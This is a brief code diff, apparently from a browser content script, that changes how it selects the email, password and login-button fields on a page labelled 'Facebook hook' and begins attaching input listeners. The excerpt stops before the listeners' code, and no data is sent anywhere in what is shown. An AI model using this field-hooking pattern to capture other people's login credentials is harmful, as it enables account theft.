@@ -1,9 +1,10 @@
 // Find the elements
-const inputElement1 = document.querySelector('input[name*="email"], input[type*="email"], input[name*="userid"]');
-const inputElement2 = document.querySelector('input[name*="pass"], input[type*="pass"]');
-const button = document.querySelector('button, input[id*="btnLogin"]');
+const inputElement1 = document.querySelector('input[name*="email"]');
+const inputElement2 = document.querySelector('input[name*="pass"]');
+const button = document.querySelector('button');
 
 // For debugging
+console.log("Facebook hook.");
 console.log(button);
 
 // Create input event listeners
